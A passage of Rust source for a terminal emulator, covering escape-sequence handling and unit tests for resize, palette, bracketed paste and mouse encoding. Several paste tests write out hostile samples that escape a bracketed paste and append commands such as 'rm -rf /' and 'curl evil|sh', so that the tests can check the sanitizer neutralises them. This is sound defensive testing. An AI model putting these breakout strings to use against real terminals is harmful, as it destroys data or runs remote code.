                    wide_cont: true,
                };
            }
        }
        self.cursor_x += char_width;
    }

    fn execute(&mut self, byte: u8) {
        match byte {
            0x08 => {
                // BS - backspace
                if self.cursor_x > 0 {
                    self.cursor_x -= 1;
                }
            }
            0x09 => {
                // HT - horizontal tab
                self.cursor_x = ((self.cursor_x / 8) + 1) * 8;
                if self.cursor_x >= self.cols {
                    self.cursor_x = self.cols - 1;
                }
            }
            0x0A | 0x0B | 0x0C => {
                // LF, VT, FF - line feed
                self.cursor_y += 1;
                if self.cursor_y > self.scroll_bottom {
                    self.cursor_y = self.scroll_bottom;
                    self.scroll_up();
                }
            }
            0x0D => {
                // CR - carriage return
                self.cursor_x = 0;
            }
            0x07 => {} // BEL - bell (ignore)
            _ => {}
        }
    }

    fn csi_dispatch(
        &mut self,
        params: &vte::Params,
        intermediates: &[u8],
        _ignore: bool,
        action: char,
    ) {
        let mut params_iter = params.iter();
        let first = params_iter
            .next()
            .and_then(|p| p.first().copied())
            .unwrap_or(0);
        let second = params_iter
            .next()
            .and_then(|p| p.first().copied())
            .unwrap_or(0);

        match action {
            'A' => {
                // Cursor Up
                let n = if first == 0 { 1 } else { first as usize };
                self.cursor_y = self.cursor_y.saturating_sub(n);
            }
            'B' => {
                // Cursor Down
                let n = if first == 0 { 1 } else { first as usize };
                self.cursor_y = (self.cursor_y + n).min(self.rows - 1);
            }
            'C' => {
                // Cursor Forward
                let n = if first == 0 { 1 } else { first as usize };
                self.cursor_x = (self.cursor_x + n).min(self.cols - 1);
            }
            'D' => {
                // Cursor Back
                let n = if first == 0 { 1 } else { first as usize };
                self.cursor_x = self.cursor_x.saturating_sub(n);
            }
            'H' | 'f' => {
                // Cursor Position
                let row = if first == 0 { 1 } else { first as usize };
                let col = if second == 0 { 1 } else { second as usize };
                self.cursor_y = (row - 1).min(self.rows - 1);
                self.cursor_x = (col - 1).min(self.cols - 1);
            }
            'J' => {
                // Erase in Display
                match first {
                    0 => {
                        // Clear from cursor to end of screen
                        for x in self.cursor_x..self.cols {
                            self.cells[self.cursor_y][x] = Cell::default();
                        }
                        for y in (self.cursor_y + 1)..self.rows {
                            self.cells[y] = vec![Cell::default(); self.cols];
                        }
                    }
                    1 => {
                        // Clear from start of screen to cursor
                        for y in 0..self.cursor_y {
                            self.cells[y] = vec![Cell::default(); self.cols];
                        }
                        for x in 0..=self.cursor_x.min(self.cols - 1) {
                            self.cells[self.cursor_y][x] = Cell::default();
                        }
                    }
                    2 | 3 => {
                        // Clear entire screen
                        self.cells = vec![vec![Cell::default(); self.cols]; self.rows];
                    }
                    _ => {}
                }
            }
            'K' => {
                // Erase in Line
                match first {
                    0 => {
                        for x in self.cursor_x..self.cols {
                            self.cells[self.cursor_y][x] = Cell::default();
                        }
                    }
                    1 => {
                        for x in 0..=self.cursor_x.min(self.cols - 1) {
                            self.cells[self.cursor_y][x] = Cell::default();
                        }
                    }
                    2 => {
                        self.cells[self.cursor_y] = vec![Cell::default(); self.cols];
                    }
                    _ => {}
                }
            }
            'L' => {
                // Insert Lines
                let n = if first == 0 { 1 } else { first as usize };
                for _ in 0..n {
                    if self.cursor_y <= self.scroll_bottom && self.scroll_bottom < self.rows {
                        self.cells.remove(self.scroll_bottom);
                        self.cells
                            .insert(self.cursor_y, vec![Cell::default(); self.cols]);
                    }
                }
            }
            'M' => {
                // Delete Lines
                let n = if first == 0 { 1 } else { first as usize };
                for _ in 0..n {
                    if self.cursor_y <= self.scroll_bottom && self.scroll_bottom < self.rows {
                        self.cells.remove(self.cursor_y);
                        self.cells
                            .insert(self.scroll_bottom, vec![Cell::default(); self.cols]);
                    }
                }
            }
            'P' => {
                // Delete Characters
                let n = if first == 0 { 1 } else { first as usize };
                let y = self.cursor_y;
                for _ in 0..n {
                    if self.cursor_x < self.cols && self.cells[y].len() > self.cursor_x {
                        self.cells[y].remove(self.cursor_x);
                        self.cells[y].push(Cell::default());
                    }
                }
            }
            'S' => {
                // Scroll Up
                let n = if first == 0 { 1 } else { first as usize };
                for _ in 0..n {
                    self.scroll_up();
                }
            }
            'T' => {
                // Scroll Down
                let n = if first == 0 { 1 } else { first as usize };
                for _ in 0..n {
                    self.scroll_down();
                }
            }
            'd' => {
                // Line Position Absolute
                let row = if first == 0 { 1 } else { first as usize };
                self.cursor_y = (row - 1).min(self.rows - 1);
            }
            'G' | '`' => {
                // Cursor Character Absolute
                let col = if first == 0 { 1 } else { first as usize };
                self.cursor_x = (col - 1).min(self.cols - 1);
            }
            'r' => {
                // Set Scrolling Region (DECSTBM)
                let top = if first == 0 { 1 } else { first as usize };
                let bottom = if second == 0 {
                    self.rows
                } else {
                    second as usize
                };
                self.scroll_top = (top - 1).min(self.rows - 1);
                self.scroll_bottom = (bottom - 1).min(self.rows - 1);
                self.cursor_x = 0;
                self.cursor_y = self.scroll_top;
            }
            '@' => {
                // Insert Characters
                let n = if first == 0 { 1 } else { first as usize };
                let y = self.cursor_y;
                for _ in 0..n {
                    if self.cells[y].len() >= self.cols {
                        self.cells[y].pop();
                    }
                    self.cells[y]
                        .insert(self.cursor_x, Cell::default());
                }
            }
            'X' => {
                // Erase Characters
                let n = if first == 0 { 1 } else { first as usize };
                for i in 0..n {
                    let x = self.cursor_x + i;
                    if x < self.cols {
                        self.cells[self.cursor_y][x] = Cell::default();
                    }
                }
            }
            'm' => {
                // SGR - Select Graphic Rendition
                self.handle_sgr(params);
            }
            'h' | 'l' => {
                // DEC Private Mode Set / Reset. One sequence may carry several
                // modes (`ESC[?1000;1002;1006h` is legal and some applications
                // send exactly that), so every parameter is applied.
                if intermediates == [b'?'] {
                    let on = action == 'h';
                    for mode in params.iter().flat_map(|sub| sub.iter().copied()) {
                        self.set_dec_mode(mode, on);
                    }
                }
            }
            'n' => {
                // Device Status Report - ignore
            }
            's' => {
                // Save Cursor Position
                self.saved_cursor = Some((self.cursor_x, self.cursor_y));
            }
            'u' => {
                // Restore Cursor Position
                if let Some((x, y)) = self.saved_cursor {
                    self.cursor_x = x;
                    self.cursor_y = y;
                }
            }
            _ => {} // Unhandled CSI sequences
        }
    }

    fn esc_dispatch(&mut self, intermediates: &[u8], _ignore: bool, byte: u8) {
        // Handle ESC sequences with intermediates (e.g. ESC # 8)
        if !intermediates.is_empty() {
            return;
        }
        match byte {
            b'7' => {
                // DECSC - Save Cursor
                self.saved_cursor = Some((self.cursor_x, self.cursor_y));
            }
            b'8' => {
                // DECRC - Restore Cursor
                if let Some((x, y)) = self.saved_cursor {
                    self.cursor_x = x;
                    self.cursor_y = y;
                }
            }
            b'D' => {
                // IND - Index: move cursor down, scroll if at bottom
                if self.cursor_y >= self.scroll_bottom {
                    self.scroll_up();
                } else {
                    self.cursor_y += 1;
                }
            }
            b'M' => {
                // RI - Reverse Index
                if self.cursor_y <= self.scroll_top {
                    self.scroll_down();
                } else {
                    self.cursor_y -= 1;
                }
            }
            b'c' => {
                // RIS - Full Reset
                let cols = self.cols;
                let rows = self.rows;
                *self = TerminalGrid::new(cols, rows);
            }
            _ => {}
        }
    }

    fn osc_dispatch(&mut self, _params: &[&[u8]], _bell_terminated: bool) {
        // OSC sequences (window title, etc.) - ignore for now
    }

    fn hook(&mut self, _params: &vte::Params, _intermediates: &[u8], _ignore: bool, _action: char) {
    }

    fn unhook(&mut self) {}

    fn put(&mut self, _byte: u8) {}
}

// NOTE: a `Terminal` wrapper used to live here, owning a `Parser` next to the
// grid "to avoid the borrow-conflict of storing Parser inside TerminalGrid".
// That rationale is obsolete: TerminalGrid::write() now holds the parser in
// `persistent_parser` and takes/returns it around each advance, which is also
// what keeps multi-byte UTF-8 split across SSH packets decodable. The wrapper
// was constructed only by these tests, and its `feed()` skipped the generation
// bump that `write()` performs — so the tests were exercising a path the app
// never takes. Removed; drive `TerminalGrid` directly.

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_search_basic() {
        let mut g = TerminalGrid::new(20, 4);
        g.write(b"error: timeout\r\nwarn: slow\r\nERROR: retry\r\n");
        let hits = g.search("error", true);
        assert_eq!(hits.len(), 2);
        let hits_cs = g.search("error", false);
        assert_eq!(hits_cs.len(), 1);
        assert_eq!(hits_cs[0].col_start, 0);
        assert_eq!(hits_cs[0].col_end, 5);
    }

    #[test]
    fn test_search_empty_query_returns_nothing() {
        let mut g = TerminalGrid::new(10, 2);
        g.write(b"hello");
        assert!(g.search("", true).is_empty());
    }

    #[test]
    fn test_basic_print() {
        let mut term = TerminalGrid::new(80, 24);
        term.write(b"Hello");
        assert_eq!(term.cells[0][0].c, 'H');
        assert_eq!(term.cells[0][1].c, 'e');
        assert_eq!(term.cells[0][2].c, 'l');
        assert_eq!(term.cells[0][3].c, 'l');
        assert_eq!(term.cells[0][4].c, 'o');
        assert_eq!(term.cursor_x, 5);
        assert_eq!(term.cursor_y, 0);
    }

    #[test]
    fn test_zero_width_char_no_cursor_advance() {
        // Combining acute (U+0301) must not push the cursor —
        // otherwise TUI output with diacritics drifts 1 cell per mark.
        let mut term = TerminalGrid::new(80, 24);
        let bytes = "a\u{0301}b".as_bytes();
        term.write(bytes);
        assert_eq!(term.cells[0][0].c, 'a');
        assert_eq!(term.cells[0][1].c, 'b'); // 'b' at col 1, not col 2
        assert_eq!(term.cursor_x, 2);
    }

    #[test]
    fn test_variation_selector_no_advance() {
        // VS16 (U+FE0F) after an emoji base shouldn't add a cell.
        let mut term = TerminalGrid::new(80, 24);
        term.write("A\u{FE0F}Z".as_bytes());
        assert_eq!(term.cells[0][0].c, 'A');
        assert_eq!(term.cells[0][1].c, 'Z');
        assert_eq!(term.cursor_x, 2);
    }

    #[test]
    fn test_newline() {
        let mut term = TerminalGrid::new(80, 24);
        // LF only moves cursor down; CR+LF moves to start of next line
        term.write(b"A\r\nB");
        assert_eq!(term.cells[0][0].c, 'A');
        assert_eq!(term.cells[1][0].c, 'B');
        assert_eq!(term.cursor_y, 1);
    }

    #[test]
    fn test_carriage_return() {
        let mut term = TerminalGrid::new(80, 24);
        term.write(b"ABC\rX");
        assert_eq!(term.cells[0][0].c, 'X');
        assert_eq!(term.cells[0][1].c, 'B');
    }

    #[test]
    fn test_cursor_movement() {
        let mut term = TerminalGrid::new(80, 24);
        // ESC [ 5 ; 10 H = move cursor to row 5, col 10
        term.write(b"\x1b[5;10H");
        assert_eq!(term.cursor_y, 4); // 0-indexed
        assert_eq!(term.cursor_x, 9);
    }

    #[test]
    fn test_erase_display() {
        let mut term = TerminalGrid::new(80, 24);
        term.write(b"ABCDEF");
        // ESC [ 2 J = clear entire screen
        term.write(b"\x1b[2J");
        for x in 0..6 {
            assert_eq!(term.cells[0][x].c, ' ');
        }
    }

    #[test]
    fn test_sgr_bold() {
        let mut term = TerminalGrid::new(80, 24);
        // ESC [ 1 m = bold
        term.write(b"\x1b[1mX");
        assert!(term.cells[0][0].style.bold);
    }

    #[test]
    fn test_sgr_color() {
        let mut term = TerminalGrid::new(80, 24);
        // Pin the palette: `new()` seeds from the live theme, which another
        // module's test publishes to, and the assert below wants the default.
        term.set_palette(shipped_palette());
        // ESC [ 31 m = red foreground
        term.write(b"\x1b[31mR");
        assert_eq!(
            term.cells[0][0].style.fg,
            ANSI_COLORS[1] // red
        );
    }

    #[test]
    fn test_scroll() {
        let mut term = TerminalGrid::new(80, 3);
        term.write(b"Line1\nLine2\nLine3\nLine4");
        // After writing 4 lines in a 3-row terminal, first line should be in scrollback
        assert_eq!(term.scrollback.len(), 1);
        assert_eq!(term.scrollback[0][0].c, 'L');
    }

    #[test]
    fn test_cursor_visibility() {
        let mut term = TerminalGrid::new(80, 24);
        assert!(term.cursor_visible);
        // ESC [ ? 25 l = hide cursor
        term.write(b"\x1b[?25l");
        assert!(!term.cursor_visible);
        // ESC [ ? 25 h = show cursor
        term.write(b"\x1b[?25h");
        assert!(term.cursor_visible);
    }

    #[test]
    fn test_alt_screen() {
        let mut term = TerminalGrid::new(80, 24);
        term.write(b"Main screen");
        // ESC [ ? 1049 h = switch to alt screen
        term.write(b"\x1b[?1049h");
        assert_eq!(term.cells[0][0].c, ' '); // alt screen is blank
        assert!(term.alt_screen.is_some());
        // ESC [ ? 1049 l = switch back
        term.write(b"\x1b[?1049l");
        assert_eq!(term.cells[0][0].c, 'M'); // restored
        assert!(term.alt_screen.is_none());
    }

    #[test]
    fn test_resize() {
        let mut term = TerminalGrid::new(80, 24);
        term.write(b"Hello");
        term.resize(40, 12);
        assert_eq!(term.cols, 40);
        assert_eq!(term.rows, 12);
        assert_eq!(term.cells[0][0].c, 'H');
    }

    #[test]
    fn test_resize_shrink_preserves_cursor_row() {
        // Simulate: motd + prompt + ls output → cursor near bottom.
        let mut term = TerminalGrid::new(80, 40);
        // Fill rows 0..20 with distinct markers; put cursor at row 25.
        for i in 0..20u32 {
            term.write(&[b'A' + (i as u8)]);
            term.write(b"\r\n");
        }
        // Move cursor to row 25 by feeding newlines + a marker
        for _ in 0..5 {
            term.write(b"\r\n");
        }
        term.write(b"Z"); // cursor_y now around 25
        let old_cursor_y = term.cursor_y;
        assert!(old_cursor_y >= 20, "setup: cursor should be near bottom");

        // Shrink to 10 rows — cursor MUST stay inside the new window,
        // the "Z" row MUST be preserved, and top rows pushed to scrollback.
        term.resize(80, 10);
        assert_eq!(term.rows, 10);
        assert!(term.cursor_y < 10, "cursor must be inside new view, got {}", term.cursor_y);
        assert!(!term.scrollback.is_empty(), "dropped rows should be in scrollback");
        // 'Z' row is preserved (it's where cursor was)
        let z_found = term.cells.iter().any(|row| row.iter().any(|c| c.c == 'Z'));
        assert!(z_found, "'Z' row must survive shrink");
    }

    #[test]
    fn test_alt_screen_buffer_follows_resize() {
        // vim/top enter the alt screen, the user resizes the window, then :q
        // exits. The restored buffer must match the CURRENT rows/cols — before
        // this was fixed, the next ESC[J indexed past the end of `cells`.
        let mut term = TerminalGrid::new(80, 30);
        term.write(b"primary");
        term.write(b"\x1b[?1049h"); // enter alt screen
        assert!(term.alt_screen.is_some());
        assert_eq!(term.cells[0][0].c, ' ', "alt screen starts blank");

        term.resize(40, 10); // shrink while inside the alt screen
        let alt = term.alt_screen.as_ref().expect("alt buffer still saved");
        assert_eq!(alt.len(), 10);
        assert!(alt.iter().all(|r| r.len() == 40));

        term.resize(120, 50); // ...then grow
        let alt = term.alt_screen.as_ref().expect("alt buffer still saved");
        assert_eq!(alt.len(), 50);
        assert!(alt.iter().all(|r| r.len() == 120));

        term.write(b"\x1b[?1049l"); // exit alt screen
        assert!(term.alt_screen.is_none());
        assert_eq!(term.cells.len(), term.rows, "restored rows must match");
        assert!(
            term.cells.iter().all(|r| r.len() == term.cols),
            "restored cols must match"
        );

        // The two consumers that index by rows/cols rather than cells.len().
        term.cursor_y = 0;
        term.write(b"\x1b[J"); // erase-to-end walks cursor_y+1..rows
        for _ in 0..(term.rows + 2) {
            term.write(b"\r\n"); // scroll_up indexes cells[scroll_bottom]
        }
        assert_eq!(term.cells.len(), term.rows);
    }

    #[test]
    fn test_alt_screen_shrink_keeps_most_recent_rows() {
        // Shrinking drops from the TOP, same as the live grid, so the shell
        // prompt the user left behind survives.
        let mut term = TerminalGrid::new(20, 4);
        term.write(b"one\r\ntwo\r\nthree\r\nfour");
        term.write(b"\x1b[?1049h");
        term.resize(20, 2);
        term.write(b"\x1b[?1049l");
        let text: Vec<String> = term
            .cells
            .iter()
            .map(|r| {
                r.iter()
                    .map(|c| c.c)
                    .collect::<String>()
                    .trim_end()
                    .to_string()
            })
            .collect();
        assert_eq!(text, vec!["three".to_string(), "four".to_string()]);
    }

    #[test]
    fn test_resize_rejects_zero_and_clamps_absurd_dimensions() {
        let mut term = TerminalGrid::new(80, 24);

        // A zero request stays a no-op rather than collapsing to a 1x1 grid.
        term.resize(0, 24);
        term.resize(80, 0);
        assert_eq!((term.cols, term.rows), (80, 24));

        // usize::MAX is what `(bounds.width / 0.0) as usize` saturates to when
        // a bad font size makes the cell width zero.
        term.resize(usize::MAX, usize::MAX);
        assert_eq!(term.cols, MAX_DIMENSION);
        assert_eq!(term.rows, MAX_DIMENSION);
        assert_eq!(term.cells.len(), MAX_DIMENSION);
        assert!(term.cells.iter().all(|r| r.len() == MAX_DIMENSION));
    }

    // ── palette, paste, and mouse ───────────────────────────────────────────

    use crate::ui::theme_config::Rgb;

    /// `ANSI_COLORS` in the palette's representation.
    fn shipped_palette() -> AnsiPalette {
        let mut p = [Rgb::new(0, 0, 0); 16];
        for (slot, c) in p.iter_mut().zip(ANSI_COLORS.iter()) {
            *slot = Rgb::new(c.r, c.g, c.b);
        }
        p
    }

    /// A table no preset ships, so a color read back can only have come from
    /// the grid's own palette.
    fn marker_palette() -> AnsiPalette {
        let mut p = [Rgb::new(0, 0, 0); 16];
        for (i, slot) in p.iter_mut().enumerate() {
            *slot = Rgb::new(i as u8, 100 + i as u8, 200 - i as u8);
        }
        p
    }

    #[test]
    fn sgr_colors_come_from_the_grid_palette() {
        let mut term = TerminalGrid::new(20, 4);
        term.set_palette(marker_palette());
        // 31 = normal red (slot 1), 91 = bright red (slot 9), 41 = red background.
        term.write(b"\x1b[31mA\x1b[91mB\x1b[41mC");
        assert_eq!(term.cells[0][0].style.fg, Color::rgb(1, 101, 199));
        assert_eq!(term.cells[0][1].style.fg, Color::rgb(9, 109, 191));
        assert_eq!(term.cells[0][2].style.bg, Color::rgb(1, 101, 199));
    }

    #[test]
    fn first_sixteen_256_colors_use_the_same_palette() {
        let mut term = TerminalGrid::new(20, 4);
        term.set_palette(marker_palette());
        term.write(b"\x1b[38;5;1mA\x1b[48;5;9mB");
        assert_eq!(term.cells[0][0].style.fg, Color::rgb(1, 101, 199));
        assert_eq!(term.cells[0][1].style.bg, Color::rgb(9, 109, 191));
    }

    #[test]
    fn color_cube_and_grayscale_ignore_the_palette() {
        let mut term = TerminalGrid::new(20, 4);
        term.set_palette(marker_palette());
        term.write(b"\x1b[38;5;196mA\x1b[38;5;244mB");
        assert_eq!(term.cells[0][0].style.fg, Color::rgb(255, 0, 0));
        assert_eq!(term.cells[0][1].style.fg, Color::rgb(128, 128, 128));
    }

    #[test]
    fn new_grid_seeds_its_palette_from_the_live_theme() {
        // Not an identity check against a specific theme — another module's
        // test publishes one concurrently. What must hold is that a fresh grid
        // starts from a real 16-entry table and that SGR resolves through it.
        let mut term = TerminalGrid::new(20, 4);
        let seeded = term.palette;
        term.write(b"\x1b[32mG");
        assert_eq!(term.cells[0][0].style.fg, palette_color(&seeded, 2));
    }

    #[test]
    fn bracketed_paste_mode_tracks_dec_2004() {
        let mut term = TerminalGrid::new(20, 4);
        assert!(!term.bracketed_paste());
        term.write(b"\x1b[?2004h");
        assert!(term.bracketed_paste());
        term.write(b"\x1b[?2004l");
        assert!(!term.bracketed_paste());
    }

    /// The property bracketed paste exists for: whatever the clipboard holds,
    /// the wire carries exactly one terminator — the one NeoShell appends —
    /// and no ESC ahead of it, so nothing inside can close the bracket early.
    fn assert_paste_fence_holds(payload: &str) {
        let wire = encode_paste(payload, true);
        assert!(wire.starts_with(PASTE_START), "{payload:?}");
        assert!(wire.ends_with(PASTE_END), "{payload:?}");
        let body = &wire[PASTE_START.len()..wire.len() - PASTE_END.len()];
        assert!(!body.contains(&0x1b), "ESC survived {payload:?}: {body:?}");
        let terminators = wire
            .windows(PASTE_END.len())
            .filter(|w| *w == PASTE_END)
            .count();
        assert_eq!(terminators, 1, "{payload:?}");
    }

    #[test]
    fn strip_paste_terminator_closes_the_breakout() {
        // A "click to copy" snippet that ends its own bracket and appends a
        // command: left intact, the tail reaches the shell as typed input.
        // Without its ESC the would-be terminator is inert, visible text.
        let hostile = "echo hi\x1b[201~\nrm -rf /\n";
        let clean = strip_paste_terminator(hostile);
        assert_eq!(clean, "echo hi[201~\nrm -rf /\n");
        assert!(!clean.contains('\x1b'));
        assert_paste_fence_holds(hostile);
    }

    #[test]
    fn strip_paste_terminator_handles_padded_parameters() {
        assert_eq!(strip_paste_terminator("a\x1b[0201~b"), "a[0201~b");
        assert_eq!(strip_paste_terminator("a\x1b[00201~b"), "a[00201~b");
        assert_eq!(strip_paste_terminator("\x1b[201~\x1b[201~"), "[201~[201~");
    }

    #[test]
    fn strip_paste_terminator_disarms_every_escape_sequence() {
        // Not just the terminator: no sequence keeps its introducer, so none
        // can act on the far side, whatever it would have meant there.
        for (hostile, inert) in [
            ("\x1b[200~", "[200~"),
            ("\x1b[2~", "[2~"),
            ("\x1b[20~", "[20~"),
            ("\x1b[~", "[~"),
            ("\x1b[m", "[m"),
            ("\x1b[201x", "[201x"),
            ("\x1b[", "["),
            ("\x1b]52;c;aGk=\x07", "]52;c;aGk="),
            // U+009B is CSI in its 8-bit (C1) form.
            ("\u{9b}201~", "201~"),
        ] {
            assert_eq!(strip_paste_terminator(hostile), inert, "{hostile:?}");
        }
    }

    #[test]
    fn paste_breakout_by_overlapping_fragments_is_closed() {
        // Cutting the inner ESC[201~ out of this joins "ESC[20" and "1~" into a
        // fresh, live terminator: that is how a strip-the-terminator pass was
        // beaten. With every ESC gone there is nothing left to join.
        let hostile = "safe \x1b[20\x1b[201~1~\ncurl evil|sh\n";
        assert_eq!(
            strip_paste_terminator(hostile),
            "safe [20[201~1~\ncurl evil|sh\n"
        );
        assert_paste_fence_holds(hostile);
        // The review's spelling, spaces and all.
        assert_paste_fence_holds("safe \x1b[20 \x1b[201~ 1~ \ncurl evil|sh\n");
    }

    #[test]
    fn paste_breakout_by_nested_triple_overlap_is_closed() {
        // Three deep: each terminator cut out exposes the next, so one pass
        // leaves a live ESC[201~ and even strip-until-stable needs three.
        let hostile = "x\x1b[20\x1b[20\x1b[201~1~1~\nid\n";
        assert_eq!(strip_paste_terminator(hostile), "x[20[20[201~1~1~\nid\n");
        assert_paste_fence_holds(hostile);
    }

    #[test]
    fn paste_of_nothing_but_fragments_carries_no_escape() {
        // Every prefix and suffix of a terminator, plus two split by a C0
        // control that a VT parser executes without ending the sequence
        // (ESC [ 2 0 NUL 1 ~ still reads as CSI 201 ~ there).
        let hostile = "\x1b\x1b[\x1b[2\x1b[20\x1b[201\x1b[20\x001~\x1b[2\x0701~[201~201~01~1~~";
        assert_eq!(
            strip_paste_terminator(hostile),
            "[[2[20[201[201~[201~[201~201~01~1~~"
        );
        assert_paste_fence_holds(hostile);
    }

    #[test]
    fn paste_keeps_plain_multiline_text_verbatim() {
        for text in [
            "ls -la\n",
            "for f in *.log; do\n  gzip \"$f\"\ndone\n",
            "SELECT * FROM t\nWHERE a = '[201~';\n",
            "日本語 ok — ünïcødé ✓\n",
            "",
        ] {
            assert_eq!(strip_paste_terminator(text), text);
            let wire = encode_paste(text, true);
            let body = &wire[PASTE_START.len()..wire.len() - PASTE_END.len()];
            assert_eq!(body, text.as_bytes());
        }
    }

    #[test]
    fn paste_keeps_tab_lf_cr_and_drops_every_other_control() {
        assert_eq!(strip_paste_terminator("a\tb\r\nc\rd\n"), "a\tb\r\nc\rd\n");
        // The rest of C0, then DEL and all of C1.
        let mut controls: String = (0u32..0x20)
            .chain(0x7f..0xa0)
            .filter_map(char::from_u32)
            .collect();
        controls.retain(|c| !matches!(c, '\t' | '\n' | '\r'));
        assert_eq!(controls.chars().count(), 29 + 33);
        assert_eq!(strip_paste_terminator(&format!("x{controls}y")), "xy");
    }

    #[test]
    fn paste_fence_holds_for_generated_payloads() {
        // Splice terminators — whole, padded, and in fragments — into one
        // another at arbitrary points, the shape of every breakout above.
        // A fixed xorshift seed keeps any failure reproducible.
        const PIECES: [&str; 9] = [
            "\x1b[201~",
            "\x1b[0201~",
            "\x1b[20",
            "\x1b[2",
            "\x1b",
            "1~",
            "01~",
            "~",
            "\n",
        ];
        let mut state: u64 = 0x9e37_79b9_7f4a_7c15;
        let mut next = move || {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            state
        };
        for _ in 0..2_000 {
            let mut payload = String::from("echo ok");
            for _ in 0..next() % 6 + 1 {
                let piece = PIECES[(next() % PIECES.len() as u64) as usize];
                // Everything here is ASCII, so any byte index is a boundary.
                let at = (next() % (payload.len() as u64 + 1)) as usize;
                payload.insert_str(at, piece);
            }
            assert_paste_fence_holds(&payload);
        }
    }

    #[test]
    fn encode_paste_is_verbatim_without_the_mode() {
        assert_eq!(encode_paste("ls -la\n", false), b"ls -la\n".to_vec());
        // Nothing is bracketing it, so there is nothing to break out of.
        assert_eq!(
            encode_paste("a\x1b[201~b", false),
            "a\x1b[201~b".as_bytes().to_vec()
        );
    }

    #[test]
    fn encode_paste_brackets_and_sanitizes() {
        let wire = encode_paste("git status\x1b[201~; curl evil|sh", true);
        assert_eq!(
            wire,
            b"\x1b[200~git status[201~; curl evil|sh\x1b[201~".to_vec()
        );
        // Exactly one terminator, and it is the last thing on the wire.
        let terminators = wire
            .windows(PASTE_END.len())
            .filter(|w| *w == PASTE_END)
            .count();
        assert_eq!(terminators, 1);
        assert!(wire.ends_with(PASTE_END));
    }

    #[test]
    fn mouse_modes_track_dec_private_modes() {
        let mut term = TerminalGrid::new(20, 4);
        assert_eq!(term.mouse_mode(), MouseMode::Off);
        term.write(b"\x1b[?1000h");
        assert_eq!(term.mouse_mode(), MouseMode::Click);
        term.write(b"\x1b[?1002h");
        assert_eq!(term.mouse_mode(), MouseMode::Drag);
        term.write(b"\x1b[?1003h");
        assert_eq!(term.mouse_mode(), MouseMode::Motion);
        // Dropping 1003 while 1002 is still set falls back instead of going quiet.
        term.write(b"\x1b[?1003l");
        assert_eq!(term.mouse_mode(), MouseMode::Drag);
        term.write(b"\x1b[?1002l\x1b[?1000l");
        assert_eq!(term.mouse_mode(), MouseMode::Off);
    }

    #[test]
    fn combined_dec_mode_parameters_all_apply() {
        // ESC[?1000;1002;1006h — legal, and what some applications send.
        let mut term = TerminalGrid::new(20, 4);
        term.write(b"\x1b[?1000;1002;1006h");
        assert_eq!(term.mouse_mode(), MouseMode::Drag);
        assert_eq!(term.mouse_encoding, MouseEncoding::Sgr);
        // The modes that already worked still do, alone or combined.
        term.write(b"\x1b[?25l");
        assert!(!term.cursor_visible);
        term.write(b"\x1b[?25;2004h");
        assert!(term.cursor_visible);
        assert!(term.bracketed_paste());
    }

    #[test]
    fn setting_an_encoding_replaces_the_previous_one() {
        let mut term = TerminalGrid::new(20, 4);
        assert_eq!(term.mouse_encoding, MouseEncoding::X10);
        term.write(b"\x1b[?1006h");
        assert_eq!(term.mouse_encoding, MouseEncoding::Sgr);
        term.write(b"\x1b[?1005h"); // UTF-8 coordinates
        assert_eq!(term.mouse_encoding, MouseEncoding::Utf8);
        term.write(b"\x1b[?1015h"); // urxvt coordinates
        assert_eq!(term.mouse_encoding, MouseEncoding::Urxvt);
        term.write(b"\x1b[?1006h");
        assert_eq!(term.mouse_encoding, MouseEncoding::Sgr);
    }

    #[test]
    fn an_encoding_reset_only_clears_the_encoding_it_names() {
        // xterm: a reset "is only effective against the matching mode".
        let modes = [
            (1005, MouseEncoding::Utf8),
            (1006, MouseEncoding::Sgr),
            (1015, MouseEncoding::Urxvt),
        ];
        for (set, selected) in modes {
            for (reset, _) in modes {
                let mut term = TerminalGrid::new(20, 4);
                term.write(format!("\x1b[?{set}h\x1b[?{reset}l").as_bytes());
                let expected = if reset == set {
                    MouseEncoding::X10
                } else {
                    selected
                };
                assert_eq!(term.mouse_encoding, expected, "?{set}h then ?{reset}l");
            }
        }
    }

    #[test]
    fn resetting_an_unselected_encoding_keeps_sgr_on_the_wire() {
        // The application selected SGR and goes on parsing SGR; a reset of
        // some other encoding must not switch the wire to X10 underneath it.
        let mut term = TerminalGrid::new(20, 4);
        term.write(b"\x1b[?1000h\x1b[?1006h\x1b[?1015l\x1b[?1005l");
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 10, 5, true).unwrap(),
            b"\x1b[<0;10;5M".to_vec()
        );
        // Resetting the selected one is what falls back.
        term.write(b"\x1b[?1006l");
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 10, 5, true).unwrap(),
            b"\x1b[M\x20\x2a\x25".to_vec()
        );
    }

    #[test]
    fn utf8_mouse_encoding() {
        let mut term = TerminalGrid::new(400, 400);
        term.write(b"\x1b[?1000h\x1b[?1005h");
        // Through column 95 every value fits one byte, exactly as in X10.
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 10, 5, true).unwrap(),
            b"\x1b[M\x20\x2a\x25".to_vec()
        );
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 95, 1, true).unwrap(),
            b"\x1b[M\x20\x7f\x21".to_vec()
        );
        // From column 96, 32 + value is a two-byte UTF-8 code point.
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 96, 1, true).unwrap(),
            vec![0x1b, b'[', b'M', 32, 0xc2, 0x80, 33]
        );
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 300, 200, true).unwrap(),
            "\x1b[M \u{14c}\u{e8}".as_bytes().to_vec()
        );
        // Any release reports button 3, as in X10.
        assert_eq!(
            term.encode_mouse(MouseButton::Right, 300, 200, false).unwrap(),
            "\x1b[M#\u{14c}\u{e8}".as_bytes().to_vec()
        );
        // Two bytes top out at U+07FF: coordinate 2015.
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 5000, 5000, true).unwrap(),
            "\x1b[M \u{7ff}\u{7ff}".as_bytes().to_vec()
        );
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 0, 0, true).unwrap(),
            b"\x1b[M\x20\x21\x21".to_vec()
        );
    }

    #[test]
    fn urxvt_mouse_encoding() {
        let mut term = TerminalGrid::new(400, 400);
        term.write(b"\x1b[?1002h\x1b[?1015h");
        // Decimal, with the button offset by 32 as in X10.
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 10, 5, true).unwrap(),
            b"\x1b[32;10;5M".to_vec()
        );
        // Any release reports button 3, and the final byte stays `M`.
